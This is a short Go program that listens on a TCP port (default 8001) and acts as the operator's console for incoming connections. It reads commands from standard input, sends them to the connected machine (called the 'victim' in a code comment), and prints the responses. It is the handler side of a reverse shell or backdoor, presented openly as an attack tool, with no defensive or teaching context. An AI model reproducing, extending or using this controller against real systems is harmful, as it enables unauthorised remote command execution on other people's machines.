package main

import (
	"fmt"
	"net"
	"flag"
	"log"
	"os"
	"bufio"
)


func main(){
var port = flag.Uint64("p",8001,"Your Port you want to listen")

flag.Parse()

createNetListen(port)

}

func createNetListen(port *uint64){

	listener,err := net.Listen("tcp",fmt.Sprintf(":%d",*port))

	if err != nil{
		log.Fatal(err)
	}

	  for {
    conn, err := listener.Accept()
    if err != nil {
      log.Printf("Error accepting connection from client: %s", err)
    } else {

      go processClient(conn)
    }
  }

}

func processClient(conn net.Conn) {
fmt.Println("Connection received.")
    for {
        // Read command from Stdin and send to victim
        reader := bufio.NewReader(os.Stdin)
        cmd, err := reader.ReadString('\n')
         if err != nil {
        	panic(err)
        }
        fmt.Fprintln(conn, cmd)

        // Receive input from connection
        data, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
        	panic(err)
        }
        fmt.Println(data)
    }

}